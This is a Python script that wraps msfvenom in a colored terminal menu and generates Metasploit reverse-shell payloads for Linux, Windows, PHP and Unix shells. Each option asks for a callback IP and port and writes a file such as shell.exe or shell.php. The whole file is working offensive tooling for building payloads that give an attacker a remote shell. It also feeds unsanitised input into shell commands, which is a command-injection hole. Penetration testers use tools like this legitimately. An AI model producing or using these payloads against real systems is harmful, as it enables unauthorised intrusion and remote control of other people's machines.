#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import subprocess as su
from termcolor import colored
from time import sleep

class Msf:

    @staticmethod
    def clear(): #Clear Screen Function
        su.run("clear", shell=True)

    @staticmethod
    def press_continue(): #Press Enter For Continue Function
        try:
            enter = input(colored("Press Enter For Continue...", "light_blue", attrs=['bold']))
            return
        except (KeyboardInterrupt, EOFError):
            return
    
    @staticmethod
    def run(): #Main Function

        while True:
            Msf.clear()

            print(colored(fr"""
   *     (    (                     )     )     *    
 (  `    )\ ) )\ )               ( /(  ( /(   (  `   
 )\))(  (()/((()/(  (   (   (    )\()) )\())  )\))(  
((_)()\  /(_))/(_)) )\  )\  )\  ((_)\ ((_)\  ((_)()\ 
(_()((_)(_)) (_))_|((_)((_)((_)  _((_)  ((_) (_()((_)
|  \/  |/ __|| |_  \ \ / / | __|| \| | / _ \ |  \/  |
| |\/| |\__ \| __|  \ V /  | _| | .` || (_) || |\/| |
|_|  |_||___/|_|     \_/   |___||_|\_| \___/ |_|  |_|   
-----------------------------------------------------
{colored("[01] ", "red", attrs=['bold'])}- {colored("linux/x86/meterpreter/reverse_tcp", "green", attrs=['bold'])}
{colored("[02] ", "red", attrs=['bold'])}- {colored("php/meterpreter_reverse_tcp", "green", attrs=['bold'])}
{colored("[03] ", "red", attrs=['bold'])}- {colored("windows/meterpreter/reverse_tcp", "green", attrs=['bold'])}
{colored("[04] ", "red", attrs=['bold'])}- {colored("cmd/unix/reverse_python", "green", attrs=['bold'])}
{colored("[05] ", "red", attrs=['bold'])}- {colored("cmd/unix/reverse_bash", "green", attrs=['bold'])}
{colored("[00] ", "red", attrs=['bold'])}- {colored("Back To Main Menu", "green", attrs=['bold'])}
""", "light_blue", attrs=['bold']))
            
            try:
                choice = int(input(colored("Enter : ", "light_blue", attrs=['bold'])))
            except (KeyboardInterrupt, EOFError):
                break
            except ValueError:
                print(colored("Invalid Option...", "red", attrs=['bold']))
                sleep(1)
                continue

            # Exit Option        
            if choice == 0:
                break
            
            #linux/x86/meterpreter/reverse_tcp Payload
            elif choice == 1:
                Msf.clear()
                

                try:
                    host = input(colored("Enter Your IP : ", "light_blue", attrs=['bold'])) #Get Host
                    if not host: #If user not enter host
                        print(colored("[-] Host Required...", "red", attrs=['bold']))
                        sleep(1)
                        continue # wait 1 second and continue loop
                    port = (input(colored("Enter Your Port : ", "light_blue", attrs=['bold']))) #Enter Port
                    if not port: #If user not enter port
                        print(colored("[-] Port Required...", "red", attrs=['bold']))
                        sleep(1)
                        continue #wait 1 second and continue loop

                    try:
                    
                        port = int(port) # If user not enter int value :
                    
                    except ValueError:
                        print(colored("[-] Invalid Port Number...", "red", attrs=['bold'])) #Warning Message
                        sleep(1)
                        continue
                    
                    payload = "linux/x86/meterpreter/reverse_tcp" #PAYLOAD
                    
                    su.run(f"msfvenom -p {payload} LHOST={host} LPORT={port} -f elf > shell.elf", shell=True) #RUN COMMAND
                    print(colored("[+] Payload Created Successfully...", "green", attrs=['bold']))
                    Msf.press_continue()

                    
                
                except (KeyboardInterrupt, EOFError):
                    break
                

                    
            #php/meterpreter_reverse_tcp Payload
            elif choice == 2:
                Msf.clear()
                
                try:
                    host = input(colored("Enter Your Host : ", "light_blue", attrs=['bold'])) #Get host
                    if not host: #If not host
                        print(colored("[-] Host Required...", "red", attrs=['bold'])) #Warning
                        sleep(1)
                        continue
                    port = (input(colored("Enter Your Port : ", "light_blue", attrs=['bold']))) #Get Port
                    if not port: #If not host
                        print(colored("[-] Port Required...", "red", attrs=['bold']))
                        sleep(1)
                        continue

                    try:
                    
                        port = int(port) #int port
                    
                    except ValueError:
                        print(colored("[-] Invalid Port Number...", "red", attrs=['bold'])) #warning
                        sleep(1)
                        continue
                    
                    payload = "php/meterpreter_reverse_tcp" #PAYLOAD
                    
                    su.run(f"msfvenom -p {payload} LHOST={host} LPORT={port} -f raw > shell.php", shell=True) #RUN COMMAND
                    print(colored("[+] Payload Created Successfully...\nSaved As : shell.php", "green", attrs=['bold']))
                    Msf.press_continue()

                except (KeyboardInterrupt,EOFError):
                    break
            
            #windows/meterpreter/reverse_tcp Payload
            elif choice == 3:
                Msf.clear()
                
                try:
                    host = input(colored("Enter Your Host : ", "light_blue", attrs=['bold'])) #Get Host
                    if not host:
                        print(colored("[-] Host Required...", "red", attrs=['bold'])) #Warning for host
                        sleep(1)
                        continue
                    port = (input(colored("Enter Your Port : ", "light_blue", attrs=['bold']))) #Enter port
                    if not port:
                        print(colored("[-] Port Required...", "red", attrs=['bold'])) #Warning for port
                        sleep(1)
                        continue

                    try:
                    
                        port = int(port) #int port
                    
                    except ValueError:
                        print(colored("[-] Invalid Port Number...", "red", attrs=['bold']))
                        sleep(1)
                        continue
                    
                    payload = "windows/meterpreter/reverse_tcp" #PAYLOAD
                    
                    su.run(f"msfvenom -p {payload} LHOST={host} LPORT={port} -f exe > shell.exe", shell=True) #RUN COMMAND
                    print(colored("[+] Payload Created Successfully...\nSaved As : shell.exe", "green", attrs=['bold']))
                    Msf.press_continue()

                except (KeyboardInterrupt,EOFError):
                    break
            
            #cmd/unix/reverse_python
            elif choice == 4:
                Msf.clear()
                
                try:
                    host = input(colored("Enter Your Host : ", "light_blue", attrs=['bold'])) #Get host
                    if not host:
                        print(colored("[-] Host Required...", "red", attrs=['bold']))
                        sleep(1)
                        continue
                    port = (input(colored("Enter Your Port : ", "light_blue", attrs=['bold']))) #Get port
                    if not port:
                        print(colored("[-] Port Required...", "red", attrs=['bold']))
                        sleep(1)
                        continue

                    try:
                    
                        port = int(port) #int port
                    
                    except ValueError:
                        print(colored("[-] Invalid Port Number...", "red", attrs=['bold']))
                        sleep(1)
                        continue
                    
                    payload = "cmd/unix/reverse_python" #PAYLOAD
                    
                    su.run(f"msfvenom -p {payload} LHOST={host} LPORT={port} -f raw > shell.py", shell=True) #RUN
                    print(colored("[+] Payload Created Successfully...\nSaved As : shell.py", "green", attrs=['bold']))
                    Msf.press_continue()

                except (KeyboardInterrupt,EOFError):
                    break
            
            #cmd/unix/reverse_bash Payload
            elif choice == 5:
                Msf.clear()
                
                try:
                    host = input(colored("Enter Your Host : ", "light_blue", attrs=['bold'])) #Get host
                    if not host:
                        print(colored("[-] Host Required...", "red", attrs=['bold']))
                        sleep(1)
                        continue
                    port = (input(colored("Enter Your Port : ", "light_blue", attrs=['bold']))) #Get port
                    if not port:
                        print(colored("[-] Port Required...", "red", attrs=['bold']))
                        sleep(1)
                        continue

                    try:
                    
                        port = int(port) #int port
                    
                    except ValueError:
                        print(colored("[-] Invalid Port Number...", "red", attrs=['bold']))
                        sleep(1)
                        continue
                    
                    payload = "cmd/unix/reverse_bash" #PAYLOAD
                    
                    su.run(f"msfvenom -p {payload} LHOST={host} LPORT={port} -f raw > shell.sh", shell=True) #RUN
                    print(colored("[+] Payload Created Successfully...\nSaved As : shell.sh", "green", attrs=['bold']))
                    Msf.press_continue()

                except (KeyboardInterrupt,EOFError):
                    break
